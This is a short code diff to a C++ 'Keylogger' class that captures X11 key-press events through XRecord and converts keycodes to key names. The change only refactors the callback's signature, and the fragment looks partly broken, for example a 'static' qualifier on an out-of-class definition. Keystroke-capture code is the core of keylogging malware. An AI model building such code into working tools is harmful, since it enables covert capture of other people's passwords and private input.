@@ -69,7 +69,7 @@ bool		Keylogger::xConnect(string displayName)
   return (true);
 }
 
-static std::string	Keylogger::eventCallback(XPointer priv, XRecordInterceptData *hook)
+static std::string	&Keylogger::eventCallback(XPointer priv, XRecordInterceptData *hook, std::string &solv)
 {
   if (hook->category != XRecordFromServer)
     {
@@ -81,7 +81,7 @@ static std::string	Keylogger::eventCallback(XPointer priv, XRecordInterceptData 
   if(data->event.u.u.type == KeyPress)
     {
       int c = data->event.u.u.detail;
-      std::string solv = XKeysymToString(XKeycodeToKeysym(userData->ctrlDisplay, c, 0));
+      solv = XKeysymToString(XKeycodeToKeysym(userData->ctrlDisplay, c, 0));
     }
   XRecordFreeData(hook);
   return (solv);
